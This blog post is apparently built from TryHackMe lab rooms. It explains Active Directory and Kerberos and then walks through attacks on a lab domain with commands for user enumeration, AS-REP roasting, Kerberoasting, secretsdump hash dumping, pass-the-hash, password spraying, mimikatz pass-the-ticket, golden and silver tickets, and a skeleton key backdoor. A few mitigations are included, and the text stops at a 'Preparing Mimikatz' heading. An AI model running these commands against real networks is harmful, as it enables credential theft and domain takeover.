---
layout: single
title: Active Directory 
excerpt: "Active Directory is the directory service for Windows Domain Networks. It is used by many of today's top companies and is a vital skill to comprehend when attacking Windows."
date: 2021-09-01
classes: wide

categories:
  - Blue Team
  - infosec
  - Red Team
tags:
  - Blue Team
  - Red Team
---


# Introduction

Active Directory is the directory service for Windows Domain Networks. It is used by many of today's top companies and is a vital skill to comprehend when attacking Windows.

It is recommended to have knowledge of basic network services, Windows, networking, and Powershell.

The detail of specific uses and objects will be limited as this is only a general overview of Active Directory. For more information on a specific topic look for the corresponding room or do your own research on the topic.



Caylent Isometric Illustration by Felix Oppenheimer on Dribble

## What is Active Directory? 

Active Directory is a collection of machines and servers connected inside of domains, that are a collective part of a bigger forest of domains, that make up the Active Directory network. Active Directory contains many functioning bits and pieces, a majority of which we will be covering in the upcoming tasks. To outline what we'll be covering take a look over this list of Active Directory components and become familiar with the various pieces of Active Directory: 

* Domain Controllers
* Forests, Trees, Domains
* Users + Groups 
* Trusts
* Policies 
* Domain Services
All of these parts of Active Directory come together to make a big network of machines and servers. Now that we know what Active Directory is let's talk about the why?

## Why use Active Directory? 

The majority of large companies use Active Directory because it allows for the control and monitoring of their user's computers through a single domain controller. It allows a single user to sign in to any computer on the active directory network and have access to his or her stored files and folders in the server, as well as the local storage on that machine. This allows for any user in the company to use any machine that the company owns, without having to set up multiple users on a machine. Active Directory does it all for you.

Now what we know the what and the why of Active Directory let's move on to how it works and functions.


##  Physical Active Directory

The physical Active Directory is the servers and machines on-premise, these can be anything from domain controllers and storage servers to domain user machines; everything needed for an Active Directory environment besides the software.


## Domain Controllers 

A domain controller is a Windows server that has Active Directory Domain Services (AD DS) installed and has been promoted to a domain controller in the forest. Domain controllers are the center of Active Directory -- they control the rest of the domain. I will outline the tasks of a domain controller below: 

- holds the AD DS data store 
- handles authentication and authorization services 
- replicate updates from other domain controllers in the forest
- Allows admin access to manage domain resources


## AD DS Data Store 

The Active Directory Data Store holds the databases and processes needed to store and manage directory information such as users, groups, and services. Below is an outline of some of the contents and characteristics of the AD DS Data Store:

Contains the NTDS.dit - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users
Stored by default in %SystemRoot%\NTDS
accessible only by the domain controller

That is everything that you need to know in terms of physical and on-premise Active Directory. Now move on to learn about the software and infrastructure behind the network.


## The forest

The forest is what defines everything; it is the container that holds all of the other bits and pieces of the network together  without the forest all of the other trees and domains would not be able to interact. The one thing to note when thinking of the forest is to not think of it too literally 
it is a physical thing just as much as it is a figurative thing. When we say "forest", it is only a way of describing the connection created between these trees and domains by the network.

![40b6c0148c4f466d8e18e2efefd42425](https://user-images.githubusercontent.com/89842187/131675257-d74acfe0-869d-4881-a990-605f29fea40a.png)


## Forest Overview 

A forest is a collection of one or more domain trees inside of an Active Directory network. It is what categorizes the parts of the network as a whole.

The Forest consists of these parts which we will go into farther detail with later:

- Trees - A hierarchy of domains in Active Directory Domain Services
- Domains - Used to group and manage objects 
- Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs
- Trusts - Allows users to access resources in other domains
- Objects - users, groups, printers, computers, shares
- Domain Services - DNS Server, LLMNR, IPv6
- Domain Schema - Rules for object creation



## Users + Groups
The users and groups that are inside of an Active Directory are up to you; when you create a domain controller it comes with default groups and two default users: Administrator and guest. It is up to you to create new users and create new groups to add users to.

# Users Overview 

Users are the core to Active Directory; without users why have Active Directory in the first place? There are four main types of users you'll find in an Active Directory network; however, there can be more depending on how a company manages the permissions of its users. The four types of users are: 

- Domain Admins - This is the big boss: they control the domains and are the only ones with access to the domain controller.
- Service Accounts (Can be Domain Admins) - These are for the most part never used except for service maintenance, they are required by Windows for services such as SQL to pair a service with a service account
- Local Administrators - These users can make changes to local machines as an administrator and may even be able to control other normal users, but they cannot access the domain controller
- Domain Users - These are your everyday users. They can log in on the machines they have the authorization to access and may have local administrator rights to machines depending on the organization.

## Groups Overview  

Groups make it easier to give permissions to users and objects by organizing them into groups with specified permissions. There are two overarching types of Active Directory groups: 

- Security Groups - These groups are used to specify permissions for a large number of users
- Distribution Groups - These groups are used to specify email distribution lists. As an attacker these groups are less beneficial to us but can still be beneficial in enumeration


## Default Security Groups 

There are a lot of default security groups so I won't be going into too much detail of each past a brief description of the permissions that they offer to the assigned group. Here is a brief outline of the security groups:

- Domain Controllers - All domain controllers in the domain
- Domain Guests - All domain guests
- Domain Users - All domain users
- Domain Computers - All workstations and servers joined to the domain
- Domain Admins - Designated administrators of the domain
- Enterprise Admins - Designated administrators of the enterprise
- Schema Admins - Designated administrators of the schema
- DNS Admins - DNS Administrators Group
- DNS Update Proxy - DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
- Allowed RODC Password Replication Group - Members in this group can have their passwords replicated to all read-only domain controllers in the domain
- Group Policy Creator Owners - Members in this group can modify group policy for the domain
- Denied RODC Password Replication Group - Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
- Protected Users - Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
- Cert Publishers - Members of this group are permitted to publish certificates to the directory
- Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the domain
- Enterprise Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the enterprise
- Key Admins - Members of this group can perform administrative actions on key objects within the domain.
- Enterprise Key Admins - Members of this group can perform administrative actions on key objects within the forest.
- Cloneable Domain Controllers - Members of this group that are domain controllers may be cloned.
- RAS and IAS Servers - Servers in this group can access remote access properties of users



## Trust + policies

Trusts and policies go hand in hand to help the domain and trees communicate with each other and maintain "security" inside of the network. They put the rules in place of how the domains inside of a forest can interact with each other, how an external forest can interact with the forest, and the overall domain rules or policies that a domain must follow.


## Domain Trusts Overview -

Trusts are a mechanism in place for users in the network to gain access to other resources in the domain. For the most part, trusts outline the way that the domains inside of a forest communicate to each other, in some environments trusts can be extended out to external domains and even forests in some cases.

There are two types of trusts that determine how the domains communicate. I'll outline the two types of trusts below: 

- Directional - The direction of the trust flows from a trusting domain to a trusted domain
- Transitive - The trust relationship expands beyond just two domains to include other trusted domains

The type of trusts put in place determines how the domains and trees in a forest are able to communicate and send data to and from each other when attacking an Active Directory environment you can sometimes abuse these trusts in order to move laterally throughout the network. 


## Domain Policies Overview

Policies are a very big part of Active Directory, they dictate how the server operates and what rules it will and will not follow. You can think of domain policies like domain groups, except instead of permissions they contain rules, and instead of only applying to a group of users, the policies apply to a domain as a whole. They simply act as a rulebook for Active  Directory that a domain admin can modify and alter as they deem necessary to keep the network running smoothly and securely. Along with the very long list of default domain policies, domain admins can choose to add in their own policies not already on the domain controller, for example: if you wanted to disable windows defender across all machines on the domain you could create a new group policy object to disable Windows Defender. The options for domain policies are almost endless and are a big factor for attackers when enumerating an Active Directory network. I'll outline just a few of the  many policies that are default or you can create in an Active Directory environment: 

- Disable Windows Defender - Disables windows defender across all machine on the domain
- Digitally Sign Communication (Always) - Can disable or enable SMB signing on the domain controller


## Active Directory Domain Services + Authentication

The Active Directory domain services are the core functions of an Active Directory network; they allow for management of the domain, security certificates, LDAPs, and much more. This is how the domain controller decides what it wants to do and what services it wants to provide for the domain.


## Domain Services Overview 

Domain Services are exactly what they sound like. They are services that the domain controller provides to the rest of the domain or tree. There is a wide range of various services that can be added to a domain controller; however, in this room we'll only be going over the default services that come when you set up a Windows server as a domain controller. Outlined below are the default domain services: 

LDAP - Lightweight Directory Access Protocol; provides communication between applications and directory services
Certificate Services - allows the domain controller to create, validate, and revoke public key certificates
DNS, LLMNR, NBT-NS - Domain Name Services for identifying IP hostnames


## Domain Authentication Overview 

The most important part of Active Directory -- as well as the most vulnerable part of Active Directory -- is the authentication protocols set in place. There are two main types of authentication in place for Active Directory: NTLM and Kerberos. Since these will be covered in more depth in later rooms we will not be covering past the very basics needed to understand how they apply to Active Directory as a whole. For more information on NTLM and Kerberos check out the Attacking Kerberos room - https://tryhackme.com/room/attackingkerberos.

Kerberos - The default authentication service for Active Directory uses ticket-granting tickets and service tickets to authenticate users and give users access to other resources across the domain.
NTLM - default Windows authentication protocol uses an encrypted challenge/response protocol
The Active Directory domain services are the main access point for attackers and contain some of the most vulnerable protocols for Active Directory, this will not be the last time you see them mentioned in terms of Active Directory security.

## AD in the cloud


Recently there has been a shift in Active Directory pushing the companies to cloud networks for their companies. The most notable AD cloud provider is Azure AD. Its default settings are much more secure than an on-premise physical Active Directory network; however, the cloud AD may still have vulnerabilities in it. 

## Azure AD Overview 


Azure acts as the middle man between your physical Active Directory and your users' sign on. This allows for a more secure transaction between domains, making a lot of Active Directory attacks ineffective.

![9d71f5df1710456683746771c579bdfb](https://user-images.githubusercontent.com/89842187/131675893-068d143b-1eb3-45cc-aaa1-c8e1f26d31b7.png)


##  Cloud Security Overview 


The best way to show you how the cloud takes security precautions past what is already provided with a physical network is to show you a comparison with a cloud Active Directory environment: 



## Windows Server AD
- LDAP
- NTLM
- Kerberos
- OU Tree
- Domains and forest
-Trusts

##  Azure AD
- Rest APIs
- OAuth/SAML
- OpenID
- Flat Structure
- Tenants
- Guests

This is only an overview of Active Directory in the cloud so we will not be going into detail of any of these protocols; however, I encourage you to go out and do your own research into these cloud protocols and how they are more secure than their physical counterparts, and if they themselves come with vulnerabilities

## What is Kerberos? 

Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

## Common Terminology 

- Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
- Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
- Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
- Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
- Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
- KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
- Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
- Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
- Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
- Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

## AS-REQ w/ Pre-Authentication In Detail 

The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

## Ticket Granting Ticket Contents 

In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

![image](https://user-images.githubusercontent.com/89842187/131717006-bbcdd5fc-1596-4717-ab90-2116df96c9c2.png)

# Service Ticket Contents

To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.

- Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
- User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.

![image](https://user-images.githubusercontent.com/89842187/131717089-4e52ec02-b15a-42cf-9113-a4fba293988c.png)

## Kerberos Authentication Overview

![image](https://user-images.githubusercontent.com/89842187/131717117-30821c2e-29ac-4d43-a426-1cf5f26c30b4.png)

- AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).

- AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.

- TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.

- TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.

- AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.

- AP-REP - 6.) The service grants access

## Kerberos Tickets Overview

The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

## Attack Privilege Requirements

- Kerbrute Enumeration - No domain access required 
- Pass the Ticket - Access as a user to the domain required
- Kerberoasting - Access as any user required
- AS-REP Roasting - Access as any user required
- Golden Ticket - Full domain compromise (domain admin) required 
- Silver Ticket - Service hash required 
- Skeleton Key - Full domain compromise (domain admin) required


# Attacktive Directory

## Enumeration

Basic enumeration starts out with an nmap scan. Nmap is a relatively complex utility that has been refined over the years to detect what ports are open on a device, what services are running, and even detect what operating system is running. It's important to note that not all services may be deteted correctly and not enumerated to it's fullest potential. Despite nmap being an overly complex utility, it cannot enumerate everything. Therefore after an initial nmap scan we'll be using other utilities to help us enumerate the services running on the device.


# Kerbrute Installation - 

```

Download a precompiled binary for your OS - https://github.com/ropnop/kerbrute/releases

mv kerbrute_linux_amd64 to kerbrute

chmod +x kerbrute - make kerbrute executable

./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt


```

## Enumerating Users via Kerberos

A whole host of other services are running, including Kerberos. Kerberos is a key authentication service within Active Directory. With this port open, we can use a tool called Kerbrute (by Ronnie Flathers @ropnop) to brute force discovery of users, passwords and even password spray!

Note: Several users have informed me that the latest version of Kerbrute does not contain the UserEnum flag in Kerbrute, if that is the case with the version you have selected, try a older version!

```
https://github.com/ropnop/kerbrute/releases
pip3 install kerbrute

kerbrute -domain spookysec.local -users userlist.txt

```

## Abusing Kerberos

## Introduction

After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

## Retrieving Kerberos Tickets

Impacket has a tool called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.

```

python3 GetNPUsers.py <domain>/<user> # OR cycle thru users file.

https://hashcat.net/wiki/doku.php?id=example_hashes

hashcat -m 18200 hash.txt passwordlist.txt --force

```


## Enumeration:

With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.

```
smbclient -L example --user svc-admin
smbclient \\\\spookysec.local\\backup --user svc-admin
```

## Elevating Privileges within the Domain


Let's Sync Up!

Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account "backup" gets us thinking. What is this the backup account to?

Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes

Knowing this, we can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.

## Pass The Hash 
```
/opt/impacket/examples

secretsdump.py -just-dc backup@domain.local # DUMP HASHES
python3 secretsdump.py -just-dc backup@domain.local # DUMP Hashes


https://github.com/Hackplayers/evil-winrm

evil-winrm -i ip -u User -H e******************************b

```

## Login to admin with evil-winrm

```
evil-winrm -i ip -u user -H 0e0363213e37bXXXXX497260b0bcb4fc
```

## Login to admin with psexec.py

```
python3 psexec.py Administrator:@spookysec.local -hashes aad3b435b51404XXXXX3b435b51404ee:0e0363213e37bXXXXX497260b0bcb4fc
```


## Harvesting & Brute-Forcing Tickets w/ Rubeus


Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation of the kekeo tool and developed by HarmJ0y the very well known active directory guru.

Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.

The tool has way too many attacks and features for me to cover all of them so I'll be covering only the ones I think are most crucial to understand how to attack Kerberos however I encourage you to research and learn more about Rubeus and its whole host of attacks and features here - https://github.com/GhostPack/Rubeus

Rubeus is already compiled and on the target machine.

![image](https://user-images.githubusercontent.com/89842187/131720308-1950493c-bbf0-4134-bd59-771fe7228079.png)

## Harvesting Tickets w/ Rubeus


Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

```
cd Downloads - navigate to the directory Rubeus is in

Rubeus.exe harvest /interval:30 - This command tells Rubeus to harvest for TGTs every 30 seconds

```
![image](https://user-images.githubusercontent.com/89842187/131720388-468485f5-8a97-40e3-aca2-f3efb57efbed.png)


## Brute-Forcing / Password-Spraying w/ Rubeus 

Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command: 

```
echo 10.10.236.219 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts

1. cd Downloads - navigate to the directory Rubeus is in

2  Rubeus.exe brute /password:Password1 /noticket - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user 
```

![image](https://user-images.githubusercontent.com/89842187/131721298-a04498e7-bcb7-40f7-a7af-a30ddde3468e.png)


Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.

## Kerberoasting w/ Rubeus & Impacket


In this task we'll be covering one of the most popular Kerberos attacks - Kerberoasting. Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. That is a bit out of scope for this room but it is a great tool for finding accounts to target.

In order to perform the attack, we'll be using both Rubeus as well as Impacket so you understand the various tools out there for Kerberoasting. There are other tools out there such a kekeo and Invoke-Kerberoast but I'll leave you to do your own research on those tools.

I have already taken the time to put Rubeus on the machine for you, it is located in the downloads folder.

## Kerberoasting w/ Rubeus

![image](https://user-images.githubusercontent.com/89842187/131721884-959838a5-5abc-4d62-a46d-32b65e537797.png)

- copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat

## Method 2 - Impacket

## Impacket Installation

Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20

```
cd /opt navigate to your preferred directory to save tools in 

2download the precompiled package from https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19

cd Impacket-0.9.19 navigate to the impacket directory

pip install . - this will install all needed dependencies

```
Kerberoasting w/ Impacket - 

```

cd /usr/share/doc/python3-impacket/examples/ - navigate to where GetUserSPNs.py is located

sudo python3 GetUserSPNs.py domain.local/user:Password1 -dc-ip 10.10.236.219 -request # this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash

```

## What Can a Service Account do?

After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don't want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.

## Kerberoasting Mitigation

- Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
- Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.


## AS-REP Roasting w/ Rubeus

Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.

We'll continue using Rubeus same as we have with kerberoasting and harvesting since Rubeus has a very simple and easy to understand command to AS-REP roast and attack users with Kerberos pre-authentication disabled. After dumping the hash from Rubeus we'll use hashcat in order to crack the krbasrep5 hash.

There are other tools out as well for AS-REP Roasting such as kekeo and Impacket's GetNPUsers.py. Rubeus is easier to use because it automatically finds AS-REP Roastable users whereas with GetNPUsers you have to enumerate the users beforehand and know which users may be AS-REP Roastable.

I have already compiled and put Rubeus on the machine.


## AS-REP Roasting Overview

During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

## Dumping KRBASREP5 Hashes w/ Rubeus
![image](https://user-images.githubusercontent.com/89842187/131724074-5b222aa9-85bb-4f4c-804d-ca562f968c52.png)

```
sudo python3 GetNPUsers.py controller/ -usersfile usernames2.txt -format hashcat -outputfile hashes.asreproast

Rubeus.exe asreproast
```

## AS-REP Roasting Mitigations 

- Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
- Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.


## Pass the Ticket w/ mimikatz

Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to dump a TGT from LSASS memory

This will only be an overview of how the pass the ticket attacks work as THM does not currently support networks but I challenge you to configure this on your own network.

You can run this attack on the given machine however you will be escalating from a domain admin to a domain admin because of the way the domain controller is set up.

## Pass the Ticket Overview 

Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.

![image](https://user-images.githubusercontent.com/89842187/131734848-12249a43-9a92-4896-a21a-434aa5fd2402.png)

## Prepare Mimikatz & Dump Tickets 

You will need to run the command prompt as an administrator: use the same credentials as you did to get into the machine. If you don't have an elevated command prompt mimikatz will not work properly.

```
1.) cd Downloads - navigate to the directory mimikatz is in

2.) mimikatz.exe - run mimikatz

3.) privilege::debug - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
```
![image](https://user-images.githubusercontent.com/89842187/131734978-081578ae-b49b-4ba6-9658-72bfa1cd4415.png)

```
4.) sekurlsa::tickets /export - this will export all of the .kirbi tickets into the directory that you are currently in

At this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier
```
![image](https://user-images.githubusercontent.com/89842187/131735029-762b0928-a51f-486b-84b0-455be0454a02.png)

When looking for which ticket to impersonate I would recommend looking for an administrator ticket from the krbtgt just like the one outlined in red above.

## Pass the Ticket w/ Mimikatz

Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.
```
1.) kerberos::ptt <ticket> - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket
```
![image](https://user-images.githubusercontent.com/89842187/131735093-688f533d-c6e0-4b94-b7ee-e239d3a5f8a2.png)

```
2.) klist - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.

We will not be using mimikatz for the rest of the attack.

```

![image](https://user-images.githubusercontent.com/89842187/131735140-52109cea-1e3b-4d5d-a69b-30c47c3076f9.png)

```
3.) You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.
```

![image](https://user-images.githubusercontent.com/89842187/131735175-04a2aa5c-171e-403e-a8cc-c4e03f841fac.png)

Note that this is only a POC to understand how to pass the ticket and gain domain admin the way that you approach passing the ticket may be different based on what kind of engagement you're in so do not take this as a definitive guide of how to run this attack.

## Pass the Ticket Mitigation 

Let's talk blue team and how to mitigate these types of attacks. 

- Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.


## Golden/Silver Ticket Attacks w/ mimikatz


Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to create a silver ticket.

A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.

## KRBTGT Overview 

In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.

## Golden/Silver Ticket Attack Overview - 

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

![image](https://user-images.githubusercontent.com/89842187/131737036-fc7e1d7b-b2ab-4572-ab48-0a065d82f3ab.png)

## Dump the krbtgt hash

```
﻿1.) cd downloads && mimikatz.exe - navigate to the directory mimikatz is in and run mimikatz

2.) privilege::debug - ensure this outputs [privilege '20' ok]

﻿3.) lsadump::lsa /inject /name:krbtgt - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.


```

﻿1.) cd downloads && mimikatz.exe - navigate to the directory mimikatz is in and run mimikatz

2.) privilege::debug - ensure this outputs [privilege '20' ok]

﻿3.) lsadump::lsa /inject /name:krbtgt - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.


## Create a Golden/Silver Ticket 

```
﻿1.) Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id: - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
```

![image](https://user-images.githubusercontent.com/89842187/131737142-447ed0ca-3cb1-44c0-920d-daad355a4be7.png)

## Use the Golden/Silver Ticket to access other machines 

```
﻿1.) misc::cmd - this will open a new elevated command prompt with the given ticket in mimikatz.
```
![image](https://user-images.githubusercontent.com/89842187/131739125-f91da1bf-fde5-4db5-aaa4-7115d20833a2.png)

```
2.) Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
```

![image](https://user-images.githubusercontent.com/89842187/131739153-aacd7c3b-b977-4b11-9191-1705ec3fd60f.png)

## Kerberos Backdoors w/ mimikatz

Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password. 

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. 

The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"

This will only be an overview section and will not require you to do anything on the machine however I encourage you to continue yourself and add other machines and test using skeleton keys with mimikatz.

## Skeleton Key Overview 

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

## Preparing Mimikatz

```
